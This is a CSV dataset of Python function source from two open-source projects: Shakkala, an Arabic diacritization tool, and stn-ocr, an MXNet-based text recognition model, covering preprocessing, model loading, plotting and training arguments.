Repository,Function_Name,Function_Code
Barqawiz/Shakkala,__preprocess,"def __preprocess(self, input_sent):
    input_vocab_to_int = self.dictionary['input_vocab_to_int']
    input_letters_ids = [[input_vocab_to_int.get(ch, input_vocab_to_int['<UNK>']) for ch in sent] for sent in input_sent]
    input_letters_ids = self.__pad_size(input_letters_ids, self.max_sentence)
    return input_letters_ids"
Barqawiz/Shakkala,logits_to_text,"def logits_to_text(self, logits):
    text = []
    for prediction in np.argmax(logits, 1):
        if self.dictionary['output_int_to_vocab'][prediction] == '<PAD>':
            continue
        text.append(self.dictionary['output_int_to_vocab'][prediction])
    return text"
Barqawiz/Shakkala,get_final_text,"def get_final_text(self, input_sent, output_sent):
    return helper.combine_text_with_harakat(input_sent, output_sent)"
Barqawiz/Shakkala,clean_harakat,"def clean_harakat(self, input_sent):
    return helper.clear_tashkel(input_sent)"
Barqawiz/Shakkala,__pad_size,"def __pad_size(self, x, length=None):
    return pad_sequences(x, maxlen=length, padding='post')"
Barqawiz/Shakkala,save_binary,"def save_binary(data, file, folder):
    location = os.path.join(folder, file + '.pickle')
    with open(location, 'wb') as ff:
        pickle.dump(data, ff, protocol=pickle.HIGHEST_PROTOCOL)"
Barqawiz/Shakkala,load_binary,"def load_binary(file, folder):
    location = os.path.join(folder, file + '.pickle')
    with open(location, 'rb') as ff:
        data = pickle.load(ff)
    return data"
Barqawiz/Shakkala,get_sentences,"def get_sentences(data):
    return [sent for line in re.split('[\n,،]+', data) if line for sent in sent_tokenize(line.strip()) if sent]"
Barqawiz/Shakkala,clear_punctuations,"def clear_punctuations(text):
    text = ''.join((c for c in text if c not in string.punctuation))
    return text"
Barqawiz/Shakkala,clear_english_and_numbers,"def clear_english_and_numbers(text):
    text = re.sub('[a-zA-Z0-9٠-٩]', ' ', text)
    return text"
Barqawiz/Shakkala,is_tashkel,"def is_tashkel(text):
    return any((ord(ch) in harakat for ch in text))"
Barqawiz/Shakkala,clear_tashkel,"def clear_tashkel(text):
    text = ''.join((c for c in text if ord(c) not in harakat))
    return text"
Barqawiz/Shakkala,get_harakat,"def get_harakat():
    return ''.join((chr(item) + '|' for item in harakat))[:-1]"
Barqawiz/Shakkala,get_taskel,"def get_taskel(sentence):
    output = []
    current_haraka = ''
    for ch in reversed(sentence):
        if ord(ch) in harakat:
            if current_haraka == '' or (ord(ch) == connector and chr(connector) not in current_haraka) or chr(connector) == current_haraka:
                current_haraka += ch
        else:
            if current_haraka == '':
                current_haraka = 'ـ'
            output.insert(0, current_haraka)
            current_haraka = ''
    return output"
Barqawiz/Shakkala,combine_text_with_harakat,"def combine_text_with_harakat(input_sent, output_sent):
    """"""
    harakat_stack = Stack()
    temp_stack    = Stack()
    #process harakat
    for character, haraka in zip(input_sent, output_sent):
        temp_stack = Stack()

        haraka = haraka.replace(""<UNK>"","""").replace(""<PAD>"","""").replace(""ـ"","""")

        if (character == "" "" and haraka != """" and ord(haraka) == connector):
            combine = harakat_stack.pop()
            combine += haraka
            harakat_stack.push(combine)
        else:
            harakat_stack.push(haraka)
    """"""
    input_length = len(input_sent)
    output_length = len(output_sent)
    for index in range(0, input_length - output_length):
        output_sent.append('')
    text = ''
    for (character, haraka) in zip(input_sent, output_sent):
        if haraka == '<UNK>' or haraka == 'ـ':
            haraka = ''
        text += character + '' + haraka
    return text"
Barqawiz/Shakkala,__init__,"def __init__(self):
    self.stack = []"
Barqawiz/Shakkala,isEmpty,"def isEmpty(self):
    return self.size() == 0"
Barqawiz/Shakkala,push,"def push(self, item):
    self.stack.append(item)"
Barqawiz/Shakkala,pop,"def pop(self):
    return self.stack.pop()"
Barqawiz/Shakkala,peek,"def peek(self):
    if self.size() == 0:
        return None
    else:
        return self.stack[len(self.stack) - 1]"
Barqawiz/Shakkala,size,"def size(self):
    return len(self.stack)"
Barqawiz/Shakkala,to_array,"def to_array(self):
    return self.stack"
Bartzi/stn-ocr,get_model,"def get_model(args, data_shape, output_size):
    (symbol, arg_params, aux_params) = mx.model.load_checkpoint(args.model_prefix, args.model_epoch)
    (net, loc, transformed_output, size_params) = FSNSNetwork.get_network(data_shape, output_size, 3, 1, 10, blstm=True)
    output = mx.symbol.Group([loc, transformed_output, net])
    context = mx.cpu() if args.gpus is None else [mx.gpu(int(i)) for i in args.gpus.split(',')]
    model = mx.mod.Module(output, context=context)
    model.bind(data_shapes=[('data', data_shape), ('softmax_label', (1, 30)), ('l0_forward_init_h_state', (1, 4, 256)), ('l0_forward_init_c_state_cell', (1, 4, 256)), ('l0_backward_init_h_state', (1, 4, 256)), ('l0_backward_init_c_state_cell', (1, 4, 256))], for_training=False, grad_req='null')
    arg_params['l0_forward_init_h_state'] = mx.nd.zeros((1, 4, 256))
    arg_params['l0_forward_init_c_state_cell'] = mx.nd.zeros((1, 4, 256))
    arg_params['l0_backward_init_h_state'] = mx.nd.zeros((1, 4, 256))
    arg_params['l0_backward_init_c_state_cell'] = mx.nd.zeros((1, 4, 256))
    model.set_params(arg_params, aux_params)
    return model"
Bartzi/stn-ocr,plot_bboxes,"def plot_bboxes(bbox_plotter, model, input_image, iteration):
    outputs = model.get_outputs()
    (transform_params, interpolated_areas) = bbox_plotter.get_area_data(1, outputs[0], outputs[1])
    bbox_plotter.save_extracted_regions(input_image, interpolated_areas.asnumpy(), transform_params.asnumpy(), iteration, '')"
Bartzi/stn-ocr,get_model,"def get_model(args, data_shape, output_size):
    (symbol, arg_params, aux_params) = mx.model.load_checkpoint(args.model_prefix, args.model_epoch)
    (net, loc, transformed_output, size_params) = SVHNMultiLineCTCNetwork.get_network(data_shape, output_size, 11, 2, 3)
    output = mx.symbol.Group([loc, transformed_output, net])
    context = mx.cpu() if args.gpus is None else [mx.gpu(int(i)) for i in args.gpus.split(',')]
    model = mx.mod.Module(output, context=context)
    model.bind(data_shapes=[('data', data_shape), ('softmax_label', (1, 3)), ('l0_forward_init_h_state', (1, 1, 256)), ('l0_forward_init_c_state_cell', (1, 1, 256)), ('l1_forward_init_h_state', (1, 1, 256)), ('l1_forward_init_c_state_cell', (1, 1, 256))], for_training=False, grad_req='null')
    arg_params['l0_forward_init_h_state'] = mx.nd.zeros((1, 1, 256))
    arg_params['l0_forward_init_c_state_cell'] = mx.nd.zeros((1, 1, 256))
    arg_params['l1_forward_init_h_state'] = mx.nd.zeros((1, 1, 256))
    arg_params['l1_forward_init_c_state_cell'] = mx.nd.zeros((1, 1, 256))
    model.set_params(arg_params, aux_params)
    return model"
Bartzi/stn-ocr,plot_bboxes,"def plot_bboxes(bbox_plotter, model, input_image, iteration):
    outputs = model.get_outputs()
    (transform_params, interpolated_areas) = bbox_plotter.get_area_data(1, outputs[0], outputs[1])
    labels = strip_prediction(np.argmax(outputs[2].asnumpy(), axis=1), args.blank_label)
    labels = ''.join([chr(char_map[str(x)]) for x in labels])
    bbox_plotter.save_extracted_regions(input_image, interpolated_areas.asnumpy(), transform_params.asnumpy(), iteration, labels)"
Bartzi/stn-ocr,get_model,"def get_model(args, data_shape, output_size):
    (symbol, arg_params, aux_params) = mx.model.load_checkpoint(args.model_prefix, args.model_epoch)
    (net, loc, transformed_output, size_params) = SVHNMultiLineCTCNetwork.get_network(data_shape, output_size, 46, 2, 23)
    output = mx.symbol.Group([loc, transformed_output, net])
    context = mx.cpu() if args.gpus is None else [mx.gpu(int(i)) for i in args.gpus.split(',')]
    model = mx.mod.Module(output, context=context)
    model.bind(data_shapes=[('data', data_shape), ('softmax_label', (1, 23)), ('l0_forward_init_h_state', (1, 1, 256)), ('l0_forward_init_c_state_cell', (1, 1, 256)), ('l1_forward_init_h_state', (1, 1, 256)), ('l1_forward_init_c_state_cell', (1, 1, 256))], for_training=False, grad_req='null')
    arg_params['l0_forward_init_h_state'] = mx.nd.zeros((1, 1, 256))
    arg_params['l0_forward_init_c_state_cell'] = mx.nd.zeros((1, 1, 256))
    arg_params['l1_forward_init_h_state'] = mx.nd.zeros((1, 1, 256))
    arg_params['l1_forward_init_c_state_cell'] = mx.nd.zeros((1, 1, 256))
    model.set_params(arg_params, aux_params)
    return model"
Bartzi/stn-ocr,plot_bboxes,"def plot_bboxes(bbox_plotter, model, input_image, iteration):
    outputs = model.get_outputs()
    (transform_params, interpolated_areas) = bbox_plotter.get_area_data(1, outputs[0], outputs[1])
    bbox_plotter.save_extracted_regions(input_image, interpolated_areas.asnumpy(), transform_params.asnumpy(), iteration, '')"
Bartzi/stn-ocr,parse_args,"def parse_args():
    parser = argparse.ArgumentParser(description='train an image classifer on mnist')
    parser.add_argument('train_file', type=str, help='the csv file containing all training data')
    parser.add_argument('val_file', type=str, help='the csv file containing all validation data')
    parser.add_argument('--gpus', type=str, help='the gpus will be used, e.g ""0,1,2,3""')
    parser.add_argument('--batch-size', '-b', type=int, default=128, help='the batch size')
    parser.add_argument('--lr', type=float, default=0.001, help='the initial learning rate')
    parser.add_argument('--model-prefix', type=str, help='the prefix of the model to load/save')
    parser.add_argument('--save-model-prefix', type=str, help='the prefix of the model to save')
    parser.add_argument('--num-epochs', type=int, default=10, help='the number of training epochs')
    parser.add_argument('--load-epoch', type=int, help='load the model on an epoch using the model-prefix')
    parser.add_argument('--kv-store', type=str, default='local', help='the kvstore type')
    parser.add_argument('--lr-factor', type=float, default=1, help='times the lr with a factor for every lr-factor-epoch epoch')
    parser.add_argument('--lr-factor-epoch', type=float, default=1, help='the number of epoch to factor the lr, could be .5')
    parser.add_argument('--plot', action='store_true', default=False, dest='plot_network_graph', help='plot the computational graph of the network to a file')
    parser.add_argument('--log-dir', '-l', default='logs', help='path to base log directory [default: logs]')
    parser.add_argument('--log-name', '-ln', default='training', help='name of the directory where logs and plots shall be put in [default: training]')
    parser.add_argument('--log-level', default='INFO', help='sets the log level [default: INFO]')
    parser.add_argument('--send-bboxes', default=False, action='store_true', help='send bbox images for each time step to upstream viewer (you must provide an upstream if you are using this feature)')
    parser.add_argument('--ip', help='upstream ip that can recieve bboxes')
    parser.add_argument('--port', default=1337, type=int, help='remote port to connect to')
    parser.add_argument('--gif', action='store_true', default=False, help='create a gif of plotted bboxes')
    parser.add_argument('--video', action='store_true', default=False, help='create a video of plotted bboxes')
    parser.add_argument('--fix-loc', action='store_true', default=False, help='fix the params of the localisation network')
    parser.add_argument('--progressbar', action='store_true', default=False, help='show a progressbar')
    parser.add_argument('--char-map', help='path to char map in json format, used to display current prediction')
    parser.add_argument('--blank-label', type=int, default=0, help='label that indicates the blank case [default: 0]')
    parser.add_argument('-ci', '--checkpoint_interval', type=int, help='number of iterations after which a checkpoint shall be saved')
    parser.add_argument('--zoom', type=float, default=0.9, help='default zoom value for initialisation of STN param predictor')
    parser.add_argument('--eval-image', help='path to image that shall be used by bbox plotter [default: take random image from val dataset]')
    return parser"
